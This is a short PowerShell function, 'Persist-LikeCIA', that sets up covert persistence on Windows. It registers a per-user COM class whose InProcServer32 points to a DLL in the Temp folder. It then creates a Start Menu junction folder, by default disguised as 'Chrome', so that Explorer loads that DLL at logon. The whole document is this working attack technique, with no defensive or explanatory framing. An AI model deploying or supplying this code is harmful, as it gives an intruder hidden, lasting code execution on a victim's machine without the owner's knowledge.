function Persist-LikeCIA{
[CmdletBinding()]
Param(
        [String]
        $DLLpath = "C:\Windows\Temp\clsid.dll",

        [String]
        $COMName = "CONTOSO_COM",

        [String]
        $FolderName = "Chrome"

)
    $guid = [guid]::NewGuid()
    $guid = ($guid.ToString()).ToUpper()

    cmd.exe /c reg add "HKCU\Software\Classes\CLSID\{$guid}" /t REG_SZ /d "$COMName" | Out-Null
    cmd.exe /c reg add "HKCU\Software\Classes\CLSID\{$guid}\InProcServer32" /t REG_SZ /d "$DLLpath" | Out-Null
    cmd.exe /c reg add "HKCU\Software\Classes\CLSID\{$guid}\InProcServer32" /v ThreadingModel /t REG_SZ /d "Apartment" | Out-Null
    mkdir "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\$FolderName.{$guid}" | Out-Null

}
